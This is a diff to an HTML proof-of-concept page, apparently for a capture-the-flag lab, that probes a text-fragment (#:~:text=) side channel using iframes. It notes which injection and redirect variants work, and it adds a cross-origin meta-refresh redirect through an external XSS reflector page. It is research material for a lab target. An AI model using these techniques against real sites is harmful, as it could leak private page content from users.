@@ -7,18 +7,22 @@
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=337"  height=150px width=290px></iframe>
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
 
 <ol>
 <li>
-frame 1:  html injection in same origin
+frame 1:  html injection in same origin (works)
 </li><li>
-frame 2:  without any injection
+frame 2:  without any injection (doesn't work)
 </li><li>
-frame 3:  html injection in different origin and same-site
+frame 3:  html injection in different origin and same-site (doesn't work)
 </li><li>
-frame 4:  html injection in same origin but different fragment
+frame 4:  html injection in same origin but different fragment (works)
 </li><li>
-frame 5: with location redirect
+frame 5: with location redirect (doesn't work)
+</li>
+<li>
+frame 6: cross-origin meta redirect (works)
 </li>
 </ol>
 
@@ -49,6 +53,7 @@ setTimeout( ()=> {
 	frames[1].location = "https://ctf.s1r1us.ninja/lab/";
 frames[3].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
 frames[4].location= 'https://ctf.s1r1us.ninja/lab/loc.php?cb=https://ctf.s1r1us.ninja/lab/';
+frames[5].location= 'https://terjanq.me/xss.php?html=%3Cmeta%20http-equiv=%22refresh%22%20content=%220;https://ctf.s1r1us.ninja/lab%22/%3E';
 	console.log('changing focus');
 },2000);
 
@@ -78,6 +83,7 @@ setTimeout(function(){
     frames[2].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=337';
     frames[3].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
     frames[4].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
+    frames[5].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
 },5000)
 
 
